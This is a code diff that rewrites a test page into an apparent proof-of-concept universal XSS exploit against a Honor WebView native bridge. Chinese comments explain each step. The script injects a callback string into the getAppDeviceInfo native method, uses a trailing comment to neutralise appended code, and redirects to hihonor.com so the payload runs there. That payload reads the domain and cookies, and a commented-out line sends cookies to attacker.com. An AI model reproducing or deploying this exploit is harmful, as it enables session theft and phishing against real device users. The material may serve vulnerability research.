@@ -1,50 +1,77 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>TEST</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      margin: 20px;
-    }
-    .info {
-      margin-bottom: 20px;
-    }
-  </style>
-</head>
+<script>
+// 标志位，确保漏洞利用流程只在恶意页面触发一次
+window.noJump = true;
 
-<body>
-  <div class="info" id="info"></div>
-  <script>
-    window.noJump = true
-    window.current = location.href
-    
-    function MyCallback(callbackId, eventType, data, d, e) {
-      if (window.noJump) {
-let test_Json = JSON.stringify(
-{"packageName": "jp.pokemon.pokemonunite",
-"trackingParameter": "test",
-"externalJson": "test",
-"showToast": "you are hacked",
-"isRefresh": true
-  });
-        var newFunc = MyCallback.toString();
-        var realFunc = "(()=>{" + 'alert(document.domain);' + newFunc + ";MyCallback();})();//"
-        window.Native.nativeMethod("com.hihonor.hm.h5.container.js.method.DeviceMethods", "getAppDeviceInfo", test_Json, "1", realFunc);// 窃取设备信息
-        location.href = "https://www.hihonor.com";
-      }
-      else {
-        alert(document.domain);
-      }
-       
-  }
+// 这个函数包含实际的 UXSS 恶意载荷，它将在目标域（hihonor.com）的上下文中执行
+// 我们将其定义为一个独立的函数，方便转换为字符串并注入
+function uxssPayloadForTarget() {
+    // 这里的代码将在 "https://www.hihonor.com" 的上下文中运行
+    alert('UXSS 成功！当前域名: ' + document.domain);
+    alert('当前页面的 Cookie: ' + document.cookie);
+    // 在这里可以添加更多恶意操作，例如：
+    // - 发送用户的敏感信息（如 cookie、localStorage）到攻击者的服务器
+    // - 修改页面内容，进行钓鱼攻击
+    // - 利用其他漏洞链
+    // new Image().src = "http://attacker.com/steal_data?domain=" + encodeURIComponent(document.domain) + "&cookie=" + encodeURIComponent(document.cookie);
+}
 
-    MyCallback();
+// MyCallback 函数，用于在恶意页面上触发原生方法并重定向
+function MyCallback(callbackId, eventType, data, d, e) {
+    if (window.noJump) {
+        // 1. 获取 uxssPayloadForTarget 函数的字符串表示
+        let payloadFuncString = uxssPayloadForTarget.toString();
 
+        // 2. 对 payloadFuncString 进行转义，以便安全地嵌入到另一个 JavaScript 字符串字面量中
+        //    - 先转义反斜杠，再转义双引号，防止转义符被错误转义
+        //    - 替换 \xa0 (非中断空格) 为其 Unicode 转义形式 \u00A0
+        payloadFuncString = payloadFuncString
+            .replace(/\\/g, '\\\\')     // 转义所有反斜杠
+            .replace(/"/g, '\\"')       // 转义所有双引号
+            .replace(/\xa0/g, '\\u00A0'); // 转义非中断空格
+
+        // 3. 构造 `realFunc` 字符串。
+        //    这个字符串将作为回调参数传递给原生方法，并在目标域被 evaluateJS 执行。
+        //    它是一个立即执行函数表达式 (IIFE)，内部定义并调用了我们的恶意载荷。
+        //    末尾的 `//` 至关重要，它会注释掉原生方法可能自动添加的 ` && (...)` 部分，
+        //    确保我们的代码能够独立且无语法错误地执行。
+        var realFunc = `
+            (function() {
+                // 在目标域的上下文中重新定义并执行恶意载荷函数
+                // 注意：'function ' 关键字是必要的，因为它将字符串化的函数重新构造为函数对象
+                var func = function ${payloadFuncString};
+                func(); // 执行恶意载荷
+            })();//
+        `.trim().replace(/\n/g, ''); // 移除换行符和首尾空格，确保注入字符串的简洁性
+
+        // 4. 准备 JSON payload
+        let test_Json = JSON.stringify({
+            "packageName": "jp.pokemon.pokemonunite",
+            "trackingParameter": "test",
+            "externalJson": "test",
+            "showToast": "UXSS Attack Initiated!", // 可能会在设备上显示一个提示
+            "isRefresh": true
+        });
+
+        // 5. 调用 window.Native.nativeMethod，将我们精心构造的 `realFunc` 作为回调参数传入
+        window.Native.nativeMethod(
+            "com.hihonor.hm.h5.container.js.method.DeviceMethods",
+            "getAppDeviceInfo",
+            test_Json,
+            "1",
+            realFunc // 传入包含完整恶意逻辑的 JS 代码字符串
+        );
+
+        // 6. 立即重定向到目标域。
+        //    这个同步的重定向操作会在异步的原生回调执行之前完成。
+        location.href = "https://www.hihonor.com"; // 假设这是我们想要攻击的目标域
+    } else {
+        // 这个 else 分支是为调试或回退准备的，理论上在成功利用时不会被触发
+        // 因为实际的 UXSS 载荷已经在 `realFunc` 中执行了
+        alert("Fallback alert in target domain (should be from injected code): " + document.domain);
+    }
+}
+
+// 在恶意页面加载时，首次调用 MyCallback 来启动漏洞利用流程
+MyCallback();
 
 </script>
-
-</body>
-</html>
